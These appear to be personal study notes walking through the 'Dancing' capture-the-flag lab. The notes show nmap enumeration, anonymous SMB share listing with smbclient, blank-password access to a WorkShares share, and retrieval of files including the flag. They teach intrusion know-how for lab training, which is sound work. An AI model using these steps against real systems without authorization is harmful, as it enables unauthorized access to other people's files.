---
 
---

# DANCING
---
## Getting Started
---
Use command to set Target IP
```bash
IP=10.129.161.101 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 06:45 EDT
Nmap scan report for 10.129.161.101
Host is up (0.028s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-30T14:46:08
|_  start_date: N/A
|_clock-skew: 4h00m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds


```


**Findings**
System is using [SMB](obsidian://open?vault=OSCP&file=SERVICES%2FSMB%2FInfo). 



---
### SMBCLIENT
---
Command
```bash
smbclient -L $IP | copy
```

Note
>Logged in without a password.

Result
```bash
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

```

**Findings**

| SHARE | INFO | 
| ----- | ---- |
|**ADMIN$** | Administrative shares are hidden network shares created by the Windows NT family of  operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled. | 
|**C$** |Administrative share for the C:\ disk volume. This is where the operating system is hosted. | 
|**IPC$** |The inter-process communication share. Used for inter-process communication via named  pipes and is not part of the file system. |
|**WorkShares** | Custom share.|

---
## Foothold
---
Try to connect to each of the shares except for the IPC$ one, which is not valuable for us since it is  not browsable as any regular directory would be. 

Give a blank  password for each username to see if it works. 

**ADMIN$**
Command
```bash
smbclient \\\\$IP\\ADMIN$
```

Result
```bash
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```


**Findings**
The NT_STATUS_ACCESS_DENIED is output, letting us know that we do not have the proper credentials to  connect to this share.

**C$**
Command
```bash
smbclient \\\\$IP\\C$	
```

Result
```bash
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

**Findings**
The NT_STATUS_ACCESS_DENIED is output, letting us know that we do not have the proper credentials to  connect to this share.

**WorkShares**
Command
```bash
smbclient \\\\$IP\\WorkShares
```

Result
```bash
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
```

Command
```bash
smb: \> help
```

Result
```bash

?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
```

Command
```bash
smb: \> ls
```

Result
```bash

  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1751700 blocks available
```

Command
```bash
smb: \> cd Amy.J\m

smb: \Amy.J\> ls
```

Result
```bash

  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

		5114111 blocks of size 4096. 1751700 blocks available
```

Command
```bash
[?2004hsmb: \Amy.J\> get worknotes.txt 
```

Command
```bash
[?2004hsmb: \Amy.J\> cd ..
smb: \> cd KJames.P\
```

Command
```bash
smb: \James.P\> ls
```

Result
```bash
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

		5114111 blocks of size 4096. 1751700 blocks available
```

Command
```bash
smb: \James.P\> get flag.txt 
smb: \James.P\> exit
```

**Findings**
Got access to the share.
Found two users and retrieved two files.

Command
```bash
cat flag.txt
```

Result
```bash
5f61c10dffbc77a704d76016a22f1664
```

---
## Flags
---
user.text
```bash
5f61c10dffbc77a704d76016a22f1664
```
---
## Tags
---
#smbclient